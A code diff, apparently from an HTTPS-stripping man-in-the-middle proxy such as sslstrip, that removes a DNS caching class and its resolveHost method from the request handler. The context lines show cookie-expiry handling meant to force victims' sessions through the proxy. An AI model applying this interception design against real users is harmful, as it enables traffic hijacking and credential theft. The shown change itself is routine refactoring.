@@ -26,7 +26,6 @@ from twisted.internet import ssl
 from twisted.web.http import Request
 
 from CookieCleaner import CookieCleaner
-from DnsCache import DnsCache
 from SSLServerConnection import SSLServerConnection
 from ServerConnection import ServerConnection
 from ServerConnectionFactory import ServerConnectionFactory
@@ -45,7 +44,6 @@ class ClientRequest(Request):
         self.reactor = reactor
         self.urlMonitor = URLMonitor.getInstance
         self.cookieCleaner = CookieCleaner.getInstance()
-        self.dnsCache = DnsCache.getInstance()
 
     #        self.uniqueId      = random.randint(0, 10000)
 
@@ -92,8 +90,6 @@ class ClientRequest(Request):
         postData = self.content.read()
         url = 'http://' + host + path
 
-        self.dnsCache.cacheResolution(host, address)
-
         if not self.cookieCleaner.isClean(self.method, client, host, headers):
             logging.debug("Sending expired cookies...")
             self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
@@ -112,16 +108,6 @@ class ClientRequest(Request):
     def handleHostResolvedError(self, error):
         logging.warning("Host resolution error: " + str(error))
         self.finish()
-
-    def resolveHost(self, host):
-        address = self.dnsCache.getCachedAddress(host)
-
-        if address is not None:
-            logging.debug("Host cached.")
-            return defer.succeed(address)
-        else:
-            logging.debug("Host not cached.")
-            return reactor.resolve(host)
 
     def process(self):
         logging.debug("Resolving host: %s" % (self.getHeader('host')))
